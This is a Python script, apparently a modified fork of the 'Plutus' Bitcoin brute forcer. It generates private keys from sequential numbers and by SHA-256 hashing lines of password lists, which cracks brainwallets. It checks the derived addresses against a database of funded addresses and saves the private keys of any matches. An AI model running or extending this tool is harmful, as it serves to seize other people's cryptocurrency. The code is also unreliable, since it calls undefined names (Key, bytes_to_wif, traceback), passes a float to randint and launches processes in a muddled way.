# Plutus Bitcoin Brute Forcer
# Made by Isaac Delly
# https://github.com/Isaacdelly/Plutus

import os
import time
import pickle
import hashlib
import binascii
import multiprocessing
from ellipticcurve.privateKey import PrivateKey
from binascii import hexlify
from hashlib import sha256
import os
import time
import requests
import random

DATABASE = r'database/MAR_23_2019/'
maxPage = pow(2,256) / 128
#maxPage = 904625697166532776746648320380374280100293470930272690489102837043110636675
totalAmt = 0

def getRandPage():
    return random.randint(1, maxPage)

def getPage(pageNum):
    keyList = []
    addrList = []
    addrStr1 = ""
    addrStr2 = ""
    num = (pageNum - 1) * 128 + 1
    try:
        for i in range(num, num + 128):
            key1 = Key.from_int(i)
            wif = bytes_to_wif(key1.to_bytes(), compressed=False)
            key2 = Key(wif)
            keyList.append(hex(i)[2:])
            addrList.append(key2.address)
            addrList.append(key1.address)
            if len(addrStr1): addrStr1 = addrStr1 + "|"
            addrStr1 = addrStr1 + key2.address
            if len(addrStr2): addrStr2 = addrStr2 + "|"
            addrStr2 = addrStr2 + key1.address
    except:
        pass
    return [keyList, addrList, addrStr1, addrStr2]

def generate_private_key_by_str(passphrase): 
	return sha256(passphrase.encode('utf-8')).hexdigest().upper()

def generate_private_key(): 
	"""
	Generate a random 32-byte hex integer which serves as a randomly 
	generated Bitcoin private key.
	Average Time: 0.0000061659 seconds
	"""
	page = getRandPage()
	addr = binascii.hexlify(page.to_bytes(32, byteorder="big")).decode('utf-8').upper()
	# addr = binascii.hexlify(os.urandom(32)).decode('utf-8').upper()
	# print(os.urandom(32))
	# seed = 'L5YP7M7HcHSdcy1sMjTynYwM1duZxMj8ZEvNBSSkqmzYkiBrrHqo' # 'The Times 03/Jan/2009 Chancellor on brink of second bailout for banks hash'
	# addr = binascii.hexlify(os.urandom(32)).decode('utf-8').upper()
	# passphrase = 'satoshi Nakamoto'

	# addr = sha256(passphrase.encode('utf-8')).hexdigest().upper()
	# addr = binascii.hexlify(hexlify(seed.encode())).decode('utf-8').upper()
		
	return addr

def private_key_to_public_key(private_key):
	"""
	Accept a hex private key and convert it to its respective public key. 
	Because converting a private key to a public key requires SECP256k1 ECDSA 
	signing, this function is the most time consuming and is a bottleneck in 
	the overall speed of the program.
	Average Time: 0.0031567731 seconds
	"""
	pk = PrivateKey().fromString(bytes.fromhex(private_key))
	return '04' + pk.publicKey().toString().hex().upper()

def public_key_to_address(public_key):
	"""
	Accept a public key and convert it to its resepective P2PKH wallet address.
	Average Time: 0.0000801390 seconds
	"""
	output = []
	alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
	var = hashlib.new('ripemd160')
	encoding = binascii.unhexlify(public_key.encode())
	var.update(hashlib.sha256(encoding).digest())
	var_encoded = ('00' + var.hexdigest()).encode()
	digest = hashlib.sha256(binascii.unhexlify(var_encoded)).digest()
	var_hex = '00' + var.hexdigest() + hashlib.sha256(digest).hexdigest()[0:8]
	count = [char != '0' for char in var_hex].index(True) // 2
	n = int(var_hex, 16)
	while n > 0:
		n, remainder = divmod(n, 58)
		output.append(alphabet[remainder])
	for i in range(count): output.append(alphabet[0])
	return ''.join(output[::-1])

def getBalances(addrStr):
	balances = "security"
	
	while True:
		if "security" not in balances: break
		secAddr = balances.split("effects address ")
		if len(secAddr) >= 2:
			secAddr = secAddr[1].split(".")[0]
			addrStr = addrStr.replace(secAddr + "|", "")
			addrStr = addrStr.replace("|" + secAddr, "")
		try:
			r = requests.get(url='https://blockchain.info/q/addressbalance/%s' % addrStr, timeout=5)
			balances = r.text
			return int(balances)

		except:
			traceback.print_exc()
			return 0
			return
	# try:
	# 	balances = json.loads(balances)
	# 	balances = balances['addresses']
	# 	# balances = balances['total_received']
	# except:
	# 	print(balances)
	# return int(balances)

def process(private_key, public_key, address, database):
	"""
	Accept an address and query the database. If the address is found in the 
	database, then it is assumed to have a balance and the wallet data is 
	written to the hard drive. If the address is not in the database, then it 
	is assumed to be empty and printed to the user.
	Average Time: 0.0000026941 seconds
	"""
	# balance = getBalances(address)
	# if balance > 0:
	# 	with open('plutus_api_final.txt', 'a') as file:
	# 		file.write('hex private key: ' + str(private_key) + '\n' +
	# 			'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n' +
	# 				'public key: ' + str(public_key) + '\n' +
	# 				'address: ' + str(address) + '\n\n')

	if address in database[0] or \
	   address in database[1] or \
	   address in database[2] or \
	   address in database[3]:
		with open('plutus.txt', 'a') as file:
			file.write('hex private key: ' + str(private_key) + '\n' +
				   'WIF private key: ' + str(private_key_to_WIF(private_key)) + '\n' +
						 'public key: ' + str(public_key) + '\n' +
					   'address: ' + str(address) + '\n\n')
	# else: 
		# print(str(address))

def private_key_to_WIF(private_key):
	"""
	Convert the hex private key into Wallet Import Format for easier wallet 
	importing. This function is only called if a wallet with a balance is 
	found. Because that event is rare, this function is not significant to the 
	main pipeline of the program and is not timed.
	"""
	digest = hashlib.sha256(binascii.unhexlify('80' + private_key)).hexdigest()
	var = hashlib.sha256(binascii.unhexlify(digest)).hexdigest()
	var = binascii.unhexlify('80' + private_key + var[0:8])
	alphabet = chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
	value = pad = 0
	result = ''
	for i, c in enumerate(var[::-1]): value += 256**i * c
	while value >= len(alphabet):
		div, mod = divmod(value, len(alphabet))
		result, value = chars[mod] + result, div
	result = chars[value] + result
	for c in var:
		if c == 0: pad += 1
		else: break
	return chars[0] * pad + result

def main(database, idx):
	"""
	Create the main pipeline by using an infinite loop to repeatedly call the 
	functions, while utilizing multiprocessing from __main__. Because all the 
	functions are relatively fast, it is better to combine them all into 
	one process.
	"""
	# times = 1
	totalAmt = 0
	start_time = time.time()
	while True:
		private_key = generate_private_key()			# 0.0000061659 seconds
		public_key = private_key_to_public_key(private_key)	 # 0.0031567731 seconds
		address = public_key_to_address(public_key)		# 0.0000801390 seconds
		process(private_key, public_key, address, database)	 # 0.0000026941 seconds
		totalAmt = totalAmt + 1
		if totalAmt % 1000 == 0:
			sec = round(time.time() - start_time, 5)
			# start_time = time.time()
			print(f"{idx}: totalAmt={totalAmt}, time={sec}")
									# --------------------
									# 0.0032457721 seconds
		# times -= 1

def cus_main(database):
	rooPath = '.\\passwords'
	# rooPath = '.\\test'
	for r, d, f in os.walk(rooPath):
		totalFiles = len(f)
		print(f'total files: {totalFiles}')
		for idx,file  in enumerate(f):
			if '.txt' in file:
				path = os.path.join(r, file)
				print(f'open: {path} ({idx+1}/{totalFiles})')
				start_time = time.time()
				num = 0
				with open(path, "r", encoding="utf-8") as f:
					for passphrase in f.readlines():
						private_key = generate_private_key_by_str(passphrase.strip())
						public_key = private_key_to_public_key(private_key)
						address = public_key_to_address(public_key)
						process(private_key, public_key, address, database)
						num += 1
					sec = round(time.time() - start_time, 5)
					print(f'done: seconds={sec}, num={num}, avg={round(sec/num, 5)}')
				os.remove(path)
	return True

if __name__ == '__main__':
	"""
	Deserialize the database and read into a list of sets for easier selection 
	and O(1) complexity. Initialize the multiprocessing to target the main 
	function with cpu_count() concurrent processes.
	"""
	database = [set() for _ in range(4)]
	count = len(os.listdir(DATABASE))
	half = count // 2
	quarter = half // 2
	for c, p in enumerate(os.listdir(DATABASE)):
		 print('\rreading database: ' + str(c + 1) + '/' + str(count), end = ' ')
		 with open(DATABASE + p, 'rb') as file:
			 if c < half:
				 if c < quarter: database[0] = database[0] | pickle.load(file)
				 else: database[1] = database[1] | pickle.load(file)
			 else:
				 if c < half + quarter: database[2] = database[2] | pickle.load(file)
				 else: database[3] = database[3] | pickle.load(file)
	print('DONE')

	# # To verify the database size, remove the # from the line below
	# #print('database size: ' + str(sum(len(i) for i in database))); quit()
	cus_main(database)
	# main(database)
	multiprocessing.cpu_count()
	for cpu in range(4):
		multiprocessing.Process(target = main, args = (database, cpu)).start()
		multiprocessing.Process(target = cus_main, args = (database, )).start()

